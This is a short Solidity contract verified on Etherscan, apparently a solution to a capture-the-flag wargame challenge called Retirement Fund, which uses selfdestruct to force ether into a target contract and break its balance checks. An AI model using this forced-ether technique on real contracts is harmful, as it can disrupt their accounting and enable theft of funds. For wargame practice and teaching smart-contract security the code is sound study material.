/**
 *Submitted for verification at Etherscan.io on 2022-09-06
*/

pragma solidity ^0.4.21;

contract AttackRetirementFundChallenge {
    address target;
    function AttackRetirementFundChallenge(address _target) public payable {
        target = _target;
    }

    function attack() public payable {
        selfdestruct(target);
    }
}